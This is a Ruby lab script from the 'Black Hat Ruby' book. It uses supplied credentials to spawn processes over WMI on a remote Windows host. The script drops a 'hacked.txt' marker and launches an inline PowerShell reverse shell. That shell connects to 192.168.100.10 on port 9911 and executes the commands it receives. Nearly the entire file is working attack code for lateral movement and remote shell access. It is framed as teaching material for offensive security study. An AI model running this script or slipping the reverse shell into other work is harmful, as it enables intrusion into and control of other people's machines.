#!/usr/bin/env ruby
# ========================================================= #
# This file is a part of { Black Hat Ruby } book lab files. #
# ========================================================= #
#
# Author:
#   Sabri Hassanyah | @KINGSABRI
# Description:
#   WMI Reverse shell
#   https://www.fortynorthsecurity.com/under-the-hood-wmimplant-invoking-powershell/
#   https://rubyonwindows.blogspot.com/2007/07/using-ruby-wmi-to-get-win32-process.html
#   https://docs.microsoft.com/en-us/windows/desktop/wmisdk/swbemlocator-connectserver
#   https://docs.microsoft.com/en-us/windows/desktop/wmisdk/swbemlocator
#   https://docs.microsoft.com/en-us/windows/desktop/cimwin32prov/operating-system-classes
#   https://docs.microsoft.com/en-us/windows/desktop/cimwin32prov/create-method-in-class-win32-process
# Requirements:
#   Windows OS
#
unless Gem.win_platform?
  puts "[!] This script runs only on Windows OS!"
  exit!
end

require 'win32ole'

server   = ARGV[0]
username = ARGV[1]  # "[Domain\\]Username"
password = ARGV[2]
rshell   = %q{powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.100.10',9911);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"}

if (server && username && password).nil? || (server && username && password).empty?
  puts "Usage:\n  ruby wmi-rshell.rb <IPADDR> <[DOMAIN\\]USERNAME> <PASSWORD>"
  exit!
end

begin
  locator = WIN32OLE.new("WbemScripting.SWbemLocator")
  # service = locator.ConnectServer(server, "{impersonationLevel=impersonate}!root\\cimv2", username, password)
  service = locator.ConnectServer(server, "root\\cimv2", username, password)
  service.Security_.ImpersonationLevel = 3
  process = service.Get('Win32_Process')
  process.Create("cmd.exe /K echo 'Black Hat Ruby' >> C:\\hacked.txt")
  process.Create(rshell)
rescue WIN32OLERuntimeError => e
  case
  when e.message.include?('Access is denied.')
    puts "[!] Access is denied | The user '#{username}' doesn't have privileges or wrong user/pass"
    # puts e.full_message 
  when e.message.include?('The RPC server is unavailable')
    puts "[!] Can't reach the target. please check the following:"
    puts "    - IP address is correct or hostname is resovable. (#{server})"
    puts "    - Ports are accessible 135 (RPC) and 445 (WMI)"
    # puts e.full_message 
  else
    puts e.full_message 
  end
end
